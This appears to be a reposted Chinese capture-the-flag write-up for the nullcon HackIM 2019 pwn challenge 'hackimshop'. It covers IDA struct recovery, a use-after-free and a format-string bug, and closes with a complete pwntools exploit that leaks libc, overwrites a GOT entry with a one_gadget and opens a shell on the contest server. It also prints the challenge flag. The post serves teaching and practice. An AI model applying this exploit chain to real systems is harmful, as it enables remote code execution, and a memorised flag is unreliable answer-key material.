> 原文链接: https://www.anquanke.com//post/id/170659 


# HackIMshop的解析及学习


                                阅读量   
                                **139410**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/dm/1024_434_/t01f4467a8247eb332f.jpg)](https://p3.ssl.qhimg.com/dm/1024_434_/t01f4467a8247eb332f.jpg)



## 前言

正逢新年佳节之际，在准备除夕菜单闲暇之时，正好看到了nullconHackIm这个比赛，从着”就看一眼”的真香原则，去看了一两题pwn题，结果发现个挺有意思也挺有帮助新手学习pwn题中如何用ida逆向出好看的结构体的题，故记录一下相关的内容。



## hackimshop

```
➜  hackimshop checksec challenge
[*] '/home/Ep3ius/CTF/pwn/process/2019HackIM/hackimshop/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ida打开来看一下就能知道这是一个常规的菜单题，当然这里先是要讲怎么去建立结构体来让题目反编译看的更舒服，所以就选用book建立功能的函数来讲解，先是ida直接反编译的结果

```
void add_book()
`{`
  __int64 v0; // rbx
  __int64 v1; // rbx
  int i; // [rsp+Ch] [rbp-34h]
  __int64 v3; // [rsp+10h] [rbp-30h]
  unsigned __int64 size; // [rsp+18h] [rbp-28h]

  if ( num_books == 16 )
  `{`
    puts("Cart limit reached!");
  `}`
  else
  `{`
    v3 = malloc(0x38uLL);
    printf("Book name length: ");
    size = readint();
    if ( size &lt;= 0xFF )
    `{`
      printf("Book name: ");
      *(v3 + 8) = malloc(size);
      read(0, *(v3 + 8), size);
      v0 = *(v3 + 8);
      if ( *(v0 + strlen(*(v3 + 8)) - 1) == 'n' )
      `{`
        v1 = *(v3 + 8);
        *(v1 + strlen(*(v3 + 8)) - 1) = 0;
      `}`
      printf("Book price: ");
      *(v3 + 16) = readint();
      for ( i = 0; books[i]; ++i )
        ;
      books[i] = v3;
      *books[i] = i;
      ++num_books;
      strcpy(books[i] + 24, cp_stmt);
    `}`
    else
    `{`
      puts("Too big!");
    `}`
  `}`
`}`
```

一堆`*(v3+8)` ，`*(v3+16)`什么的我看的是挺头疼的，所以我先把这些结构体还原的样子贴出来一下

```
void add_book()
`{`
  char *v0; // rbx
  char *v1; // rbx
  int i; // [rsp+Ch] [rbp-34h]
  book *newbook; // [rsp+10h] [rbp-30h]
  unsigned __int64 size; // [rsp+18h] [rbp-28h]

  if ( num_books == 16 )
  `{`
    puts("Cart limit reached!");
  `}`
  else
  `{`
    newbook = malloc(0x38uLL);
    printf("Book name length: ");
    size = readint();
    if ( size &lt;= 0xFF )
    `{`
      printf("Book name: ");
      newbook-&gt;name = malloc(size);
      read(0, newbook-&gt;name, size);
      v0 = newbook-&gt;name;
      if ( v0[strlen(newbook-&gt;name) - 1] == 'n' )
      `{`
        v1 = newbook-&gt;name;
        v1[strlen(newbook-&gt;name) - 1] = 0;
      `}`
      printf("Book price: ");
      newbook-&gt;price = readint();
      for ( i = 0; books[i]; ++i )
        ;
      books[i] = newbook;
      books[i]-&gt;idx = i;
      ++num_books;
      strcpy(books[i]-&gt;copy, cp_stmt);
    `}`
    else
    `{`
      puts("Too big!");
    `}`
  `}`
`}`
```

这样是不是看起来就很舒服了，这题的结构体挺简单的很适合新手上路，所以先简单的讲一下ida如何还原原来的结构体

首先我们`shift+F1`打开结构体定义的界面，接着`右键insert`插入一个新建立的也就是ida没还原但能看出来的结构体，大概长得像下面这个一样

```
strcut book
`{`
    unsigned __int64 idx;
    char *name;
    unsigned __int64 price;
    char copy[25]
`}`
```

至于为什么是这样建的，你可能c语言基础要扎实点知道在这个环境下int类型占几字节，指针占几字节这样的预备知识，而上面的结构体就是我做这题时用的结构体，建完以后到对应的变量右键选择`convert to struct *`选择刚建的结构体就能看到舒服至极的反编译了

接着我们看题目，在审计的过程中，首先能发现`remove_book`中free book后未清空book里的内容，这会造成UAF漏洞

```
void remove_book()
`{`
  unsigned __int64 idx; // [rsp+8h] [rbp-8h]

  printf("Book index: ");
  idx = readint();
  if ( num_books &gt; idx )
  `{`
    free(books[idx]-&gt;name);
    free(books[idx]);
    --num_books;
  `}`
  else
  `{`
    puts("Invalid index");
  `}`
`}`
```

接着从`view_book`中可以很容易的发现在printf copyright时如果我们能控制copyright的内容，就可以产生一个格式化字符串漏洞

```
void view_books()
`{`
  unsigned __int64 v0; // ST08_8
  signed int i; // [rsp+4h] [rbp-Ch]

  puts("`{`");
  puts("t"Books" : [");
  for ( i = 0; i &lt;= 15; ++i )
  `{`
    if ( books[i] )
    `{`
      v0 = books[i]-&gt;idx;
      puts("tt`{`");
      printf("ttt"index": %ld,n", v0);
      printf("ttt"name": "%s",n", books[i]-&gt;name);
      printf("ttt"price": %ld,n", books[i]-&gt;price);
      printf("ttt"rights": "");
      printf(books[i]-&gt;copy);  // fmt atk!!
      puts(""");
      if ( books[i + 1] )
        puts("tt`}`,");
      else
        puts("tt`}`");
    `}`
  `}`
  puts("t]");
  puts("`}`");
`}`
```

那么看到这些后就有想法了，如果我们可以控制copyright的内容的话我们就可以leak出libcbase，而UAF刚好能满足这个需求，在简单的测试后我们得到fmt的偏移量为7

```
#demo
add(0x10,'0000',0x10)
add(0x10,'1111',0x10)
free(1)
free(0)
payload = 'aaaa'+'x00'*0x14+'%7$x'
add(0x38,payload,0x10)
show()
```

```
`{`
    "Books" : [
        `{`
            "index": 2,
            "name": "aaaa",
            "price": 16,
            "rights": "Copyright NullCon Shop"
        `}`,
        `{`
            "index": 1633771873,
            "name": "(null)",
            "price": 0,
            "rights": "61616161
ight NullCon Shop"
        `}`,
        `{`
            "index": 2,
            "name": "aaaa",
            "price": 16,
            "rights": "Copyright NullCon Shop"
        `}`
    ]
`}`
NullCon Shop
(1) Add book to cart
(2) Remove from cart
(3) View cart
(4) Check out
```

这时我们可以成功的leak出libc，在libcdatabase查了一下得到远程的环境是libc2.27，这时我们切到libc2.27的环境下。

```
➜  hackimshop strings libc.so.6 | grep GNU
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Compiled by GNU CC version 7.3.0.
```

接下来就是怎么通过UAF+fmt+libcbase来getshell的问题了，说到UAF，我就想到有`house of spirit`,但用hos还需要满足一些条件，这时巨强无比的格式化字符串就出场了，任意地址写可不是开玩笑的，通过组合这些漏洞在got表里建立一个fakebook然后通过uaf去free掉，然后再从tcache中new回来这个chunk后往里写one_gadget，就成功的把got表中的函数改成onegadget，然后触发覆盖的这些函数就能getshell。

这里附上EXP

```
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# flag = hackim19`{`h0p3_7ha7_Uaf_4nd_f0rm4ts_w3r3_fun_4_you`}`
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
# n = process('./challenge')
n = remote('pwn.ctf.nullcon.net',4002)
elf = ELF('./challenge')
# libc = elf.libc
libc = ELF('./libc.so.6')

def choice(idx):
    n.recvuntil('&gt; ')
    n.sendline(str(idx))

def add(size,content,price):
    choice(1)
    n.recvuntil('length: ')
    n.sendline(str(size))
    n.recvuntil('name: ')
    n.sendline(content)
    n.recvuntil('price: ')
    n.sendline(str(price))

def free(idx):
    choice(2)
    n.recvuntil('index: ')
    n.sendline(str(idx))

def show():
    choice(3)

puts_got = elf.got['puts']
fc = elf.got['__stack_chk_fail']
cp_stmt = 0x6020a0

add(0x10,'0000',0x10)
add(0x10,'1111',0x10)
free(1)
free(0)
payload = p64(puts_got)+p64(0)*2+"%7$s"
add(0x38,payload,0x10)
show()
n.recvuntil('price": 0,n')
n.recvuntil('rights": "')
libc_base = u64(n.recv(6)+'x00x00') - libc.sym['puts']
print "libc_base:",hex(libc_base)


one_gadget = libc_base + 0x4f322
add(0x10,'aaaa',0x10)
add(0x10,'bbbb',0x10)

free(2)
payload = p64(fc)+'x00'*0x10+"%113c%7$n"
add(0x38,payload,0x10)
show()

free(2)
payload = p64(cp_stmt+8) + p64(fc+8)+p64(0)+"%113c%7$n"
add(0x38,payload,0x10)
show()

free(1)
#gdb.attach(n)
#add(0x60,p64(one_gadget)*0x10,12)
choice(1)
n.sendline(str(0x60))
n.sendline(p64(one_gadget)*0x10)

n.interactive()
```



## 后记

虽然现在打比赛没有那么勤快了，但最近打的大部分比赛的pwn题中，有很大一部分是通过漏洞之间的排列组合，或者是说是常规操作来命题的，做这类题还是有点技巧的，只要基础扎实一点，平时题目接触的多一点，这些题都是能很快得到思路的，剩下的就是根据思路去调试和踩坑了，感谢大家的阅读，最后祝大家新年快乐～
